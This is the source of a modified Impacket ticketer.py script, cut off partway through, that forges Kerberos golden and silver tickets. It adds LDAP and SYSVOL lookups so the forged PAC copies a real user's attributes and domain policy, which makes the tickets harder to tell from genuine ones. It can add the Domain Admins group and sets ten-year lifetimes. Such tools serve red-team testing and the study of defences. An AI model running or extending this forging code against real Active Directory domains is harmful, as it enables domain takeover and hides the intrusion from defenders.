#!/usr/bin/env python
# Impacket - Collection of Python classes for working with network protocols.
#
# Copyright Fortra, LLC and its affiliated companies 
#
# All rights reserved.
#
# This software is provided under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Description:
#   This script will create TGT/TGS tickets from scratch or based on a template (legally requested from the KDC)
#   allowing you to customize some of the parameters set inside the PAC_LOGON_INFO structure, in particular the
#   groups, extrasids, etc.
#   Tickets duration is fixed to 10 years from now (although you can manually change it)
#
#   Examples:
#       ./ticketer.py -nthash <krbtgt/service nthash> -domain-sid <your domain SID> -domain <your domain FQDN> baduser
#
#       will create and save a golden ticket for user 'baduser' that will be all encrypted/signed used RC4.
#       If you specify -aesKey instead of -ntHash everything will be encrypted using AES128 or AES256
#       (depending on the key specified). No traffic is generated against the KDC. Ticket will be saved as
#       baduser.ccache.
#
#       ./ticketer.py -nthash <krbtgt/service nthash> -aesKey <krbtgt/service AES> -domain-sid <your domain SID> -domain <your domain FQDN>
#                     -request -user <a valid domain user> -password <valid domain user's password> baduser
#
#       will first authenticate against the KDC (using -user/-password) and get a TGT that will be used
#       as template for customization. Whatever encryption algorithms used on that ticket will be honored,
#       hence you might need to specify both -nthash and -aesKey data. Ticket will be generated for 'baduser' and saved
#       as baduser.ccache.
#
# Author:
#   Alberto Solino (@agsolino)
#
# References:
#   - Original presentation at BlackHat USA 2014 by @gentilkiwi and @passingthehash:
#     (https://www.slideshare.net/gentilkiwi/abusing-microsoft-kerberos-sorry-you-guys-dont-get-it)
#   - Original implementation by Benjamin Delpy (@gentilkiwi) in mimikatz
#     (https://github.com/gentilkiwi/mimikatz)
#
# ToDo:
#   [X] Silver tickets still not implemented - DONE by @machosec and fixes by @br4nsh
#   [ ] When -request is specified, we could ask for a user2user ticket and also populate the received PAC
#

from __future__ import division
from __future__ import print_function
import argparse
import datetime
import logging
import random
import string
import struct
import sys
from calendar import timegm
from time import strptime
from binascii import unhexlify
from six import b

from pyasn1.codec.der import encoder, decoder
from pyasn1.type.univ import noValue

from impacket import version
from impacket.dcerpc.v5.dtypes import RPC_SID, SID
from impacket.dcerpc.v5.ndr import NDRULONG
from impacket.dcerpc.v5.samr import NULL, GROUP_MEMBERSHIP, SE_GROUP_MANDATORY, SE_GROUP_ENABLED_BY_DEFAULT, \
    SE_GROUP_ENABLED, USER_NORMAL_ACCOUNT, USER_DONT_EXPIRE_PASSWORD
from impacket.examples import logger
from impacket.krb5.asn1 import AS_REP, TGS_REP, ETYPE_INFO2, AuthorizationData, EncTicketPart, EncASRepPart, EncTGSRepPart, AD_IF_RELEVANT
from impacket.krb5.constants import ApplicationTagNumbers, PreAuthenticationDataTypes, EncryptionTypes, \
    PrincipalNameType, ProtocolVersionNumber, TicketFlags, encodeFlags, ChecksumTypes, AuthorizationDataType, \
    KERB_NON_KERB_CKSUM_SALT
from impacket.krb5.keytab import Keytab
from impacket.krb5.crypto import Key, _enctype_table
from impacket.krb5.crypto import _checksum_table, Enctype
from impacket.krb5.pac import KERB_SID_AND_ATTRIBUTES, PAC_SIGNATURE_DATA, PAC_INFO_BUFFER, PAC_LOGON_INFO, \
    PAC_CLIENT_INFO_TYPE, PAC_SERVER_CHECKSUM, PAC_PRIVSVR_CHECKSUM, PACTYPE, PKERB_SID_AND_ATTRIBUTES_ARRAY, \
    VALIDATION_INFO, PAC_CLIENT_INFO, KERB_VALIDATION_INFO, UPN_DNS_INFO_FULL, PAC_REQUESTOR_INFO, PAC_UPN_DNS_INFO, PAC_ATTRIBUTES_INFO, PAC_REQUESTOR, \
    PAC_ATTRIBUTE_INFO
from impacket.krb5.types import KerberosTime, Principal
from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS

from impacket.krb5 import constants, pac
from impacket.krb5.asn1 import AP_REQ, TGS_REQ, Authenticator, seq_set, seq_set_iter, PA_FOR_USER_ENC, Ticket as TicketAsn1
from impacket.krb5.crypto import _HMACMD5, _AES256CTS, string_to_key
from impacket.krb5.kerberosv5 import sendReceive
from impacket.krb5.types import Ticket
from impacket.winregistry import hexdump
from impacket.examples.utils import ldap_login
from impacket.smbconnection import SMBConnection
from impacket.ldap import ldapasn1
from impacket.dcerpc.v5.samr import UF_ACCOUNTDISABLE
import xml.etree.ElementTree as ET
import re

class TICKETER:
    def __init__(self, target, password, domain, options):
        self.__password = password
        self.__target = target
        self.__domain = domain
        self.__options = options
        self.__tgt = None
        self.__tgt_session_key = None
        
        # LDAP connection info
        self.__ldap_connection = None
        self.__smb_connection = None
        self.__user_info = {}
        self.__group_info = []
        self.__kerberos_policies = {}
        self.__domain_policy = {}
        self.__well_known_sids = {}
        
        if options.spn:
            spn = options.spn.split('/')
            self.__service = spn[0]
            self.__server = spn[1]
            if options.keytab is not None:
                self.loadKeysFromKeytab(options.keytab)

        # we are creating a golden ticket
        else:
            self.__service = 'krbtgt'
            self.__server = self.__domain

    @staticmethod
    def getFileTime(t):
        t *= 10000000
        t += 116444736000000000
        return t

    @staticmethod
    def getPadLength(data_length):
        return ((data_length + 7) // 8 * 8) - data_length

    @staticmethod
    def getBlockLength(data_length):
        return (data_length + 7) // 8 * 8

    def connectToLDAP(self):
        """Connect to LDAP to retrieve user and group information"""
        if not self.__options.request or not self.__options.ldap:
            return
            
        try:
            logging.info('Connecting to LDAP to gather user and group information...')
            
            # Create baseDN
            domainParts = self.__domain.split('.')
            baseDN = ''
            for i in domainParts:
                baseDN += 'dc=%s,' % i
            baseDN = baseDN[:-1]
            
            # Connect to LDAP
            self.__ldap_connection = ldap_login(
                target=self.__options.dc_ip or self.__domain,
                base_dn=baseDN,
                kdc_ip=self.__options.dc_ip,
                kdc_host=None,
                do_kerberos=False,
                username=self.__options.user,
                password=self.__password,
                domain=self.__domain,
                lmhash='',
                nthash='',
                aeskey=''
            )
            
            # Retrieve user information
            self.getUserInfo()
            
            # Retrieve group membership
            self.getGroupMembership()
            
            logging.info('Successfully gathered user information from LDAP')
            
        except Exception as e:
            logging.error('Failed to connect to LDAP: %s' % str(e))
            logging.warning('Continuing with provided parameters...')
    
    def getUserInfo(self):
        """Retrieve user attributes from LDAP"""
        try:
            if self.__ldap_connection is None:
                logging.error('LDAP connection not established')
                return
                
            searchFilter = '(sAMAccountName=%s)' % self.__target
            # Extended attributes for full PAC - matching legitimate ticket structure
            attributes = [
                'sAMAccountName', 'objectSid', 'memberOf', 'userAccountControl',
                'pwdLastSet', 'lastLogon', 'lastLogonTimestamp', 'displayName', 'mail',
                'scriptPath', 'profilePath', 'homeDirectory', 'homeDrive',
                'logonCount', 'badPwdCount', 'primaryGroupID', 'userPrincipalName',
                'accountExpires', 'badPasswordTime', 'lockoutTime', 'whenCreated',
                'whenChanged', 'description', 'telephoneNumber', 'physicalDeliveryOfficeName',
                # Additional fields for complete PAC matching
                'lastSuccessfulInteractiveLogon', 'lastFailedInteractiveLogon',
                'failedInteractiveLogonCount', 'logonServer', 'logonDomainName',
                'logonDomainId', 'userSessionKey', 'lmKey', 'subAuthStatus',
                'reserved3', 'resourceGroupDomainSid', 'resourceGroupCount',
                'resourceGroupIds', 'extraSids', 'extraSidCount'
            ]
            
            self.__ldap_connection.search(
                searchFilter=searchFilter,
                attributes=attributes,
                sizeLimit=1,
                perRecordCallback=self.processUserRecord
            )
            
        except Exception as e:
            logging.error('Failed to retrieve user information: %s' % str(e))
    
    def processUserRecord(self, item):
        """Process user record from LDAP"""
        if isinstance(item, ldapasn1.SearchResultEntry) is not True:
            return
        
        # Добавляем импорт datetime
        import datetime
                    
        try:
            for attribute in item['attributes']:
                attr_name = str(attribute['type'])
                
                if attr_name == 'sAMAccountName':
                    self.__user_info['sAMAccountName'] = attribute['vals'][0].asOctets().decode('utf-8')
                
                elif attr_name == 'objectSid':
                    sid_bytes = attribute['vals'][0].asOctets()
                    # Parse SID to get RID
                    if len(sid_bytes) >= 4:
                        rid = int.from_bytes(sid_bytes[-4:], 'little')
                        self.__user_info['rid'] = rid
                        # Save full SID
                        from impacket.dcerpc.v5.dtypes import SID
                        sid = SID()
                        sid.fromString(sid_bytes)
                        self.__user_info['objectSid'] = sid.formatCanonical()
                        logging.info('Found user RID: %d, SID: %s' % (rid, self.__user_info['objectSid']))
                
                elif attr_name == 'memberOf':
                    groups = []
                    for val in attribute['vals']:
                        dn = val.asOctets().decode('utf-8')
                        # Extract CN from DN
                        cn_match = re.search(r'CN=([^,]+)', dn)
                        if cn_match:
                            groups.append(cn_match.group(1))
                    self.__user_info['memberOf'] = groups
                    logging.info('Found user groups: %s' % ', '.join(groups))
                
                elif attr_name == 'userAccountControl':
                    uac = int(str(attribute['vals'][0]))
                    self.__user_info['userAccountControl'] = uac
                    logging.info('User Account Control: %d' % uac)
                
                elif attr_name == 'displayName':
                    self.__user_info['displayName'] = attribute['vals'][0].asOctets().decode('utf-8')
                    logging.info('Display Name: %s' % self.__user_info['displayName'])
                
                elif attr_name == 'mail':
                    self.__user_info['mail'] = attribute['vals'][0].asOctets().decode('utf-8')
                
                elif attr_name == 'userPrincipalName':
                    self.__user_info['userPrincipalName'] = attribute['vals'][0].asOctets().decode('utf-8')
                    logging.info('UPN: %s' % self.__user_info['userPrincipalName'])
                
                elif attr_name == 'scriptPath':
                    self.__user_info['scriptPath'] = attribute['vals'][0].asOctets().decode('utf-8')
                    logging.info('Logon Script: %s' % self.__user_info['scriptPath'])
                
                elif attr_name == 'profilePath':
                    self.__user_info['profilePath'] = attribute['vals'][0].asOctets().decode('utf-8')
                    logging.info('Profile Path: %s' % self.__user_info['profilePath'])
                
                elif attr_name == 'homeDirectory':
                    self.__user_info['homeDirectory'] = attribute['vals'][0].asOctets().decode('utf-8')
                    logging.info('Home Directory: %s' % self.__user_info['homeDirectory'])
                
                elif attr_name == 'homeDrive':
                    self.__user_info['homeDrive'] = attribute['vals'][0].asOctets().decode('utf-8')
                    logging.info('Home Drive: %s' % self.__user_info['homeDrive'])
                
                elif attr_name == 'logonCount':
                    self.__user_info['logonCount'] = int(str(attribute['vals'][0]))
                    logging.info('Logon Count: %d' % self.__user_info['logonCount'])
                
                elif attr_name == 'badPwdCount':
                    self.__user_info['badPwdCount'] = int(str(attribute['vals'][0]))
                    logging.info('Bad Password Count: %d' % self.__user_info['badPwdCount'])
                
                elif attr_name == 'primaryGroupID':
                    self.__user_info['primaryGroupID'] = int(str(attribute['vals'][0]))
                    logging.info('Primary Group ID: %d' % self.__user_info['primaryGroupID'])
                
                elif attr_name == 'pwdLastSet':
                    if str(attribute['vals'][0]) != '0':
                        # Convert Windows FILETIME to Unix timestamp
                        filetime = int(str(attribute['vals'][0]))
                        self.__user_info['pwdLastSet'] = filetime
                        import datetime
                        unix_time = (filetime - 116444736000000000) / 10000000
                        dt = datetime.datetime.fromtimestamp(unix_time, datetime.timezone.utc)
                        logging.info('Password Last Set: %s' % dt.strftime('%m/%d/%Y %I:%M:%S %p'))
                
                elif attr_name == 'lastLogon':
                    if str(attribute['vals'][0]) != '0':
                        filetime = int(str(attribute['vals'][0]))
                        self.__user_info['lastLogon'] = filetime
                        unix_time = (filetime - 116444736000000000) / 10000000
                        dt = datetime.datetime.fromtimestamp(unix_time, datetime.timezone.utc)
                        logging.info('Last Logon: %s' % dt.strftime('%m/%d/%Y %I:%M:%S %p'))
                
                elif attr_name == 'lastLogonTimestamp':
                    if str(attribute['vals'][0]) != '0':
                        filetime = int(str(attribute['vals'][0]))
                        self.__user_info['lastLogonTimestamp'] = filetime
                
                elif attr_name == 'accountExpires':
                    if str(attribute['vals'][0]) != '0' and str(attribute['vals'][0]) != '9223372036854775807':
                        filetime = int(str(attribute['vals'][0]))
                        self.__user_info['accountExpires'] = filetime
                        unix_time = (filetime - 116444736000000000) / 10000000
                        dt = datetime.datetime.fromtimestamp(unix_time, datetime.timezone.utc)
                        logging.info('Account Expires: %s' % dt.strftime('%m/%d/%Y %I:%M:%S %p'))
                    else:
                        self.__user_info['accountExpires'] = 0  # Never expires
                
                # Additional fields for completeness
                elif attr_name in ['description', 'telephoneNumber', 'physicalDeliveryOfficeName']:
                    if attribute['vals']:
                        self.__user_info[attr_name] = attribute['vals'][0].asOctets().decode('utf-8')
                
                # Interactive logon fields
                elif attr_name == 'lastSuccessfulInteractiveLogon':
                    if str(attribute['vals'][0]) != '0':
                        filetime = int(str(attribute['vals'][0]))
                        self.__user_info['lastSuccessfulInteractiveLogon'] = filetime
                        unix_time = (filetime - 116444736000000000) / 10000000
                        dt = datetime.datetime.fromtimestamp(unix_time, datetime.timezone.utc)
                        logging.info('Last Successful Interactive Logon: %s' % dt.strftime('%m/%d/%Y %I:%M:%S %p'))
                
                elif attr_name == 'lastFailedInteractiveLogon':
                    if str(attribute['vals'][0]) != '0':
                        filetime = int(str(attribute['vals'][0]))
                        self.__user_info['lastFailedInteractiveLogon'] = filetime
                        unix_time = (filetime - 116444736000000000) / 10000000
                        dt = datetime.datetime.fromtimestamp(unix_time, datetime.timezone.utc)
                        logging.info('Last Failed Interactive Logon: %s' % dt.strftime('%m/%d/%Y %I:%M:%S %p'))
                
                elif attr_name == 'failedInteractiveLogonCount':
                    self.__user_info['failedInteractiveLogonCount'] = int(str(attribute['vals'][0]))
                    logging.info('Failed Interactive Logon Count: %d' % self.__user_info['failedInteractiveLogonCount'])
                
                # Logon server and domain info
                elif attr_name == 'logonServer':
                    self.__user_info['logonServer'] = attribute['vals'][0].asOctets().decode('utf-8')
                    logging.info('Logon Server: %s' % self.__user_info['logonServer'])
                
                elif attr_name == 'logonDomainName':
                    self.__user_info['logonDomainName'] = attribute['vals'][0].asOctets().decode('utf-8')
                    logging.info('Logon Domain Name: %s' % self.__user_info['logonDomainName'])
                
                # Session key and LM key (usually not stored in LDAP, but we can set defaults)
                elif attr_name == 'userSessionKey':
                    if attribute['vals']:
                        self.__user_info['userSessionKey'] = attribute['vals'][0].asOctets()
                    else:
                        # Default 16-byte zero session key
                        self.__user_info['userSessionKey'] = b'\x00' * 16
                
                elif attr_name == 'lmKey':
                    if attribute['vals']:
                        self.__user_info['lmKey'] = attribute['vals'][0].asOctets()
                    else:
                        # Default 8-byte zero LM key
                        self.__user_info['lmKey'] = b'\x00' * 8
                
                # SubAuth status and reserved fields
                elif attr_name == 'subAuthStatus':
                    self.__user_info['subAuthStatus'] = int(str(attribute['vals'][0]))
                    logging.info('SubAuth Status: %d' % self.__user_info['subAuthStatus'])
                
                elif attr_name == 'reserved3':
                    self.__user_info['reserved3'] = int(str(attribute['vals'][0]))
                    logging.info('Reserved3: %d' % self.__user_info['reserved3'])
                    
        except Exception as e:
            logging.error('Error processing user record: %s' % str(e))
    
    def getGroupMembership(self):
        """Retrieve group membership information"""
        try:
            if self.__ldap_connection is None:
                logging.error('LDAP connection not established')
                return
                
            # First try to get user's direct group membership
            if self.__user_info and 'memberOf' in self.__user_info:
                logging.info('Retrieving user-specific group information...')
                user_groups = self.__user_info['memberOf']
                
                # Search for specific groups the user is a member of
                for group_dn in user_groups:
                    try:
                        # Extract CN from DN
                        cn_match = re.search(r'CN=([^,]+)', group_dn)
                        if cn_match:
                            group_name = cn_match.group(1)
                            searchFilter = f'(&(objectClass=group)(sAMAccountName={group_name}))'
                            attributes = ['sAMAccountName', 'objectSid', 'groupType']
                            
                            self.__ldap_connection.search(
                                searchFilter=searchFilter,
                                attributes=attributes,
                                sizeLimit=1,
                                perRecordCallback=self.processGroupRecord
                            )
                    except Exception as e:
                        logging.debug('Failed to retrieve group %s: %s' % (group_dn, str(e)))
                        continue
                
                logging.info('Retrieved %d user groups from LDAP' % len(self.__group_info))
                
            else:
                # Fallback: try to get all groups with size limit
                logging.info('Retrieving all domain groups (with size limit)...')
                searchFilter = '(objectClass=group)'
                attributes = ['sAMAccountName', 'objectSid', 'groupType']
                
                # Set a reasonable size limit to avoid sizeLimitExceeded errors
                sizeLimit = 1000
                
                try:
                    self.__ldap_connection.search(
                        searchFilter=searchFilter,
                        attributes=attributes,
                        sizeLimit=sizeLimit,
                        perRecordCallback=self.processGroupRecord
                    )
                    
                    logging.info('Retrieved %d groups from LDAP (limited to %d)' % (len(self.__group_info), sizeLimit))
                    
                except Exception as e:
                    if 'sizeLimitExceeded' in str(e):
                        logging.warning('Size limit exceeded, using minimal group set...')
                        # Just get essential groups
                        essential_groups = ['Domain Users', 'Domain Admins', 'Enterprise Admins']
                        for group_name in essential_groups:
                            try:
                                searchFilter = f'(&(objectClass=group)(sAMAccountName={group_name}))'
                                self.__ldap_connection.search(
                                    searchFilter=searchFilter,
                                    attributes=attributes,
                                    sizeLimit=1,
                                    perRecordCallback=self.processGroupRecord
                                )
                            except Exception as e2:
                                logging.debug('Failed to retrieve essential group %s: %s' % (group_name, str(e2)))
                                continue
                        
                        logging.info('Retrieved %d essential groups from LDAP' % len(self.__group_info))
                    else:
                        raise e
            
            # Get well-known SIDs and extra SIDs
            self.getWellKnownSIDs()
            
        except Exception as e:
            logging.error('Failed to retrieve group information: %s' % str(e))
            # Continue with default groups if LDAP fails
            logging.info('Continuing with default group membership...')
    
    def getWellKnownSIDs(self):
        """Get well-known SIDs that are commonly included in PAC"""
        try:
            # Common well-known SIDs that appear in legitimate tickets
            well_known_sids = {
                'S-1-18-1': 'Authentication authority asserted identity',
                'S-1-5-32-544': 'Administrators',
                'S-1-5-32-545': 'Users',
                'S-1-5-32-546': 'Guests',
                'S-1-5-32-547': 'Power Users',
                'S-1-5-32-548': 'Account Operators',
                'S-1-5-32-549': 'Server Operators',
                'S-1-5-32-550': 'Print Operators',
                'S-1-5-32-551': 'Backup Operators',
                'S-1-5-32-552': 'Replicator',
                'S-1-5-32-554': 'Pre-Windows 2000 Compatible Access',
                'S-1-5-32-555': 'Remote Desktop Users',
                'S-1-5-32-556': 'Network Configuration Operators',
                'S-1-5-32-557': 'Incoming Forest Trust Builders',
                'S-1-5-32-558': 'Performance Monitor Users',
                'S-1-5-32-559': 'Performance Log Users',
                'S-1-5-32-560': 'Windows Authorization Access Group',
                'S-1-5-32-561': 'Terminal Server License Servers',
                'S-1-5-32-562': 'Distributed COM Users',
                'S-1-5-32-569': 'Cryptographic Operators',
                'S-1-5-32-573': 'Event Log Readers',
                'S-1-5-32-574': 'Certificate Service DCOM Access',
                'S-1-5-32-575': 'RDS Remote Access Servers',
                'S-1-5-32-576': 'RDS Endpoint Servers',
                'S-1-5-32-577': 'RDS Management Servers',
                'S-1-5-32-578': 'Hyper-V Administrators',
                'S-1-5-32-579': 'Access Control Assistance Operators',
                'S-1-5-32-580': 'Remote Management Users'
            }
            
            # Store well-known SIDs for potential use in PAC
            self.__well_known_sids = well_known_sids
            
            # Add common extra SIDs that appear in legitimate tickets
            # Based on your ticket, we see S-1-18-1 (Authentication authority asserted identity)
            extra_sids = ['S-1-18-1']  # Authentication authority asserted identity
            
            if extra_sids:
                self.__user_info['extraSids'] = extra_sids
                self.__user_info['extraSidCount'] = len(extra_sids)
                logging.info('Added extra SIDs: %s' % ', '.join(extra_sids))
            
        except Exception as e:
            logging.error('Failed to get well-known SIDs: %s' % str(e))
    
    def processGroupRecord(self, item):
        """Process group record from LDAP"""
        if isinstance(item, ldapasn1.SearchResultEntry) is not True:
            return
            
        try:
            group_info = {}
            for attribute in item['attributes']:
                attr_name = str(attribute['type'])
                if attr_name == 'sAMAccountName':
                    group_info['name'] = attribute['vals'][0].asOctets().decode('utf-8')
                elif attr_name == 'objectSid':
                    sid_bytes = attribute['vals'][0].asOctets()
                    if len(sid_bytes) >= 4:
                        rid = int.from_bytes(sid_bytes[-4:], 'little')
                        group_info['rid'] = rid
                elif attr_name == 'groupType':
                    group_info['groupType'] = int(str(attribute['vals'][0]))
            
            if 'name' in group_info and 'rid' in group_info:
                self.__group_info.append(group_info)
                
        except Exception as e:
            logging.error('Error processing group record: %s' % str(e))
    
    def connectToSYSVOL(self):
        """Connect to SYSVOL to retrieve domain policies"""
        if not self.__options.request or not self.__options.ldap:
            return
            
        try:
            logging.info('Connecting to SYSVOL to gather domain policies...')
            
            # Connect to SMB
            self.__smb_connection = SMBConnection(
                self.__options.dc_ip or self.__domain,
                self.__options.dc_ip or self.__domain
            )
            
            self.__smb_connection.login(
                self.__options.user,
                self.__password,
                self.__domain
            )
            
            # Retrieve Kerberos policies
            self.extractKerberosPolicies()
            
            logging.info('Successfully gathered domain policies from SYSVOL')
            
        except Exception as e:
            logging.error('Failed to connect to SYSVOL: %s' % str(e))
            logging.warning('Continuing with default policies...')
    
    def extractKerberosPolicies(self):
        """Extract Kerberos policies from SYSVOL"""
        try:
            # Search for policy files in SYSVOL
            share_name = 'SYSVOL'
            domain_path = '%s/Policies' % self.__domain
            
            # Search for GptTmpl.inf files containing Kerberos policies
            policy_found = self.searchPolicyFiles(share_name, domain_path)
            
            if policy_found:
                logging.info('Successfully found and parsed Kerberos policy from SYSVOL')
            else:
                logging.info('No Kerberos policies found in SYSVOL, using default values')
            
        except Exception as e:
            logging.error('Failed to extract Kerberos policies: %s' % str(e))
    
    def searchPolicyFiles(self, share_name, base_path):
        """Search for policy files in SYSVOL"""
        try:
            if self.__smb_connection is None:
                logging.error('SMB connection not established')
                return False
                
            files = self.__smb_connection.listPath(share_name, base_path + '/*')
            
            for file_info in files:
                if file_info.get_longname() not in ['.', '..']:
                    if file_info.is_directory():
                        # Recursive search in subdirectories
                        sub_path = base_path + '/' + file_info.get_longname()
                        if self.searchPolicyFiles(share_name, sub_path):
                            # Policy found in subdirectory, stop searching
                            return True
                    elif file_info.get_longname().lower() == 'gpttmpl.inf':
                        # Found policy file
                        file_path = base_path + '/' + file_info.get_longname()
                        if self.parsePolicyFile(share_name, file_path):
                            # Policy successfully parsed, stop searching
                            return True
                        
        except Exception as e:
            logging.debug('Error searching policy files in %s: %s' % (base_path, str(e)))
        
        return False
    
    def parsePolicyFile(self, share_name, file_path):
        """Parse policy file"""
        try:
            if self.__smb_connection is None:
                logging.error('SMB connection not established')
                return False
                
            import io
            fh = io.BytesIO()
            self.__smb_connection.getFile(share_name, file_path, fh.write)
            content = fh.getvalue().decode('utf-16le', errors='ignore')
            
            # Find Kerberos policies
            kerberos_section = False
            for line in content.split('\n'):
                line = line.strip()
                if line == '[Kerberos Policy]':
                    kerberos_section = True
                    continue
                elif line.startswith('[') and kerberos_section:
                    kerberos_section = False
                    continue
                
                if kerberos_section and '=' in line:
                    key, value = line.split('=', 1)
                    key = key.strip()
                    value = value.strip()
                    self.__kerberos_policies[key] = value
            
            if self.__kerberos_policies:
                logging.info('Found Kerberos policies: %s' % str(self.__kerberos_policies))
                
                # Apply policy settings
                if 'MaxTicketAge' in self.__kerberos_policies:
                    try:
                        self.__domain_policy['MaxTicketAge'] = int(self.__kerberos_policies['MaxTicketAge'])
                    except ValueError:
                        logging.warning('Invalid MaxTicketAge value: %s' % self.__kerberos_policies['MaxTicketAge'])
                
                if 'MaxRenewAge' in self.__kerberos_policies:
                    try:
                        self.__domain_policy['MaxRenewAge'] = int(self.__kerberos_policies['MaxRenewAge'])
                    except ValueError:
                        logging.warning('Invalid MaxRenewAge value: %s' % self.__kerberos_policies['MaxRenewAge'])
                
                # Get password policy settings
                if 'MaxPwdAge' in self.__kerberos_policies:
                    try:
                        # Convert days to FILETIME (100-nanosecond intervals)
                        max_pwd_age_days = int(self.__kerberos_policies['MaxPwdAge'])
                        self.__domain_policy['MaxPwdAge'] = max_pwd_age_days * 24 * 60 * 60 * 10000000
                        logging.info('Found MaxPwdAge policy: %d days' % max_pwd_age_days)
                    except ValueError:
                        logging.warning('Invalid MaxPwdAge value: %s' % self.__kerberos_policies['MaxPwdAge'])
                        # Default to 90 days
                        self.__domain_policy['MaxPwdAge'] = 90 * 24 * 60 * 60 * 10000000
                else:
                    # Default to 90 days if no policy found
                    self.__domain_policy['MaxPwdAge'] = 90 * 24 * 60 * 60 * 10000000
                    logging.info('Using default MaxPwdAge: 90 days')
                
                # Return True to indicate successful policy parsing
                return True
            else:
                logging.debug('No Kerberos policies found in %s' % file_path)
                return False
                
        except Exception as e:
            logging.debug('Error parsing policy file %s: %s' % (file_path, str(e)))
            return False
    
    def updateTicketWithLDAPInfo(self):
        """Update ticket parameters based on LDAP information"""
        if not self.__user_info:
            return
            
        try:
            # Update user-id if found in LDAP
            if 'rid' in self.__user_info:
                self.__options.user_id = str(self.__user_info['rid'])
                logging.info('Updated user-id from LDAP: %s' % self.__options.user_id)
            
            # Update groups if found in LDAP
            if self.__group_info:
                # Find corresponding RIDs for user groups
                user_groups = self.__user_info.get('memberOf', [])
                group_rids = []
                
                for group in self.__group_info:
                    if group['name'] in user_groups:
                        group_rids.append(str(group['rid']))
                
                # Add standard groups
                if '513' not in group_rids:  # Domain Users
                    group_rids.append('513')
                if '512' not in group_rids and any('admin' in g.lower() for g in user_groups):  # Domain Admins
                    group_rids.append('512')
                
                if group_rids:
                    self.__options.groups = ','.join(group_rids)
                    logging.info('Updated groups from LDAP: %s' % self.__options.groups)
            
        except Exception as e:
            logging.error('Failed to update ticket with LDAP info: %s' % str(e))

    def getTicketDuration(self):
        """Calculate ticket duration based on domain policy"""
        # Default to 10 years if no policy found
        max_ticket_age = 87600  # 10 years in hours
        
        if self.__domain_policy:
            if 'MaxTicketAge' in self.__domain_policy:
                max_ticket_age = self.__domain_policy['MaxTicketAge']
                logging.info('Using MaxTicketAge from domain policy: %d hours' % max_ticket_age)
            else:
                logging.info('Using default MaxTicketAge: 10 years')
        else:
            logging.info('No domain policy found, using default MaxTicketAge: 10 years')
        
        return max_ticket_age

    def loadKeysFromKeytab(self, filename):
        keytab = Keytab.loadFile(filename)
        keyblock = keytab.getKey("%s@%s" % (options.spn, self.__domain))
        if keyblock:
            if keyblock["keytype"] == Enctype.AES256 or keyblock["keytype"] == Enctype.AES128:
                options.aesKey = keyblock.hexlifiedValue()
            elif keyblock["keytype"] == Enctype.RC4:
                options.nthash = keyblock.hexlifiedValue()
        else:
            logging.warning("No matching key for SPN '%s' in given keytab found!", options.spn)

    def createBasicValidationInfo(self):
        # 1) KERB_VALIDATION_INFO
        kerbdata = KERB_VALIDATION_INFO()

        # If LDAP is used and user data is available, use real values
        if self.__options.ldap and self.__user_info:
            logging.info('Creating PAC with real LDAP data...')
            
            # LogonTime - use current time or lastLogon from LDAP
            if 'lastLogon' in self.__user_info and self.__user_info['lastLogon']:
                logonTime = self.__user_info['lastLogon']
            else:
                aTime = timegm(datetime.datetime.now(datetime.timezone.utc).timetuple())
                logonTime = self.getFileTime(aTime)
            
            kerbdata['LogonTime']['dwLowDateTime'] = logonTime & 0xffffffff
            kerbdata['LogonTime']['dwHighDateTime'] = logonTime >> 32
            
            # PasswordLastSet - from LDAP or current time
            if 'pwdLastSet' in self.__user_info and self.__user_info['pwdLastSet']:
                pwdLastSet = self.__user_info['pwdLastSet']
            else:
                aTime = timegm(datetime.datetime.now(datetime.timezone.utc).timetuple())
                pwdLastSet = self.getFileTime(aTime)
                
            kerbdata['PasswordLastSet']['dwLowDateTime'] = pwdLastSet & 0xffffffff
            kerbdata['PasswordLastSet']['dwHighDateTime'] = pwdLastSet >> 32
            
            # PasswordCanChange - typically pwdLastSet + 1 day
            pwdCanChange = pwdLastSet + (24 * 60 * 60 * 10000000)  # +1 day in FILETIME
            kerbdata['PasswordCanChange']['dwLowDateTime'] = pwdCanChange & 0xffffffff
            kerbdata['PasswordCanChange']['dwHighDateTime'] = pwdCanChange >> 32
            
            # PasswordMustChange - use pwdLastSet + maxPwdAge from domain policy
            if 'pwdLastSet' in self.__user_info and self.__user_info['pwdLastSet']:
                pwdLastSet = self.__user_info['pwdLastSet']
                # Get max password age from domain policy (default 90 days)
                maxPwdAge = self.__domain_policy.get('MaxPwdAge', 90 * 24 * 60 * 60 * 10000000)  # 90 days in FILETIME
                pwdMustChange = pwdLastSet + maxPwdAge
                kerbdata['PasswordMustChange']['dwLowDateTime'] = pwdMustChange & 0xffffffff
                kerbdata['PasswordMustChange']['dwHighDateTime'] = pwdMustChange >> 32
                
                # Convert to readable format for logging
                unix_time = (pwdMustChange - 116444736000000000) / 10000000
                dt = datetime.datetime.fromtimestamp(unix_time, datetime.timezone.utc)
                logging.info('Password Must Change: %s' % dt.strftime('%m/%d/%Y %I:%M:%S %p'))
            else:
                # If no pwdLastSet, use current time + 90 days
                aTime = timegm(datetime.datetime.now(datetime.timezone.utc).timetuple())
                currentTime = self.getFileTime(aTime)
                maxPwdAge = self.__domain_policy.get('MaxPwdAge', 90 * 24 * 60 * 60 * 10000000)
                pwdMustChange = currentTime + maxPwdAge
                kerbdata['PasswordMustChange']['dwLowDateTime'] = pwdMustChange & 0xffffffff
                kerbdata['PasswordMustChange']['dwHighDateTime'] = pwdMustChange >> 32
            
            # Names and paths from LDAP
            kerbdata['EffectiveName'] = self.__user_info.get('sAMAccountName', self.__target)
            kerbdata['FullName'] = self.__user_info.get('displayName', '')
            kerbdata['LogonScript'] = self.__user_info.get('scriptPath', '')
            kerbdata['ProfilePath'] = self.__user_info.get('profilePath', '')
            kerbdata['HomeDirectory'] = self.__user_info.get('homeDirectory', '')
            kerbdata['HomeDirectoryDrive'] = self.__user_info.get('homeDrive', '')
            
            # Counters from LDAP
            kerbdata['LogonCount'] = self.__user_info.get('logonCount', 0)
            kerbdata['BadPasswordCount'] = self.__user_info.get('badPwdCount', 0)
            
            # User ID from LDAP
            kerbdata['UserId'] = self.__user_info.get('rid', int(self.__options.user_id))
            
            logging.info('PAC populated with LDAP data:')
            logging.info('  EffectiveName: %s' % kerbdata['EffectiveName'])
            logging.info('  FullName: %s' % kerbdata['FullName'])
            logging.info('  LogonScript: %s' % kerbdata['LogonScript'])
            logging.info('  ProfilePath: %s' % kerbdata['ProfilePath'])
            logging.info('  HomeDirectory: %s' % kerbdata['HomeDirectory'])
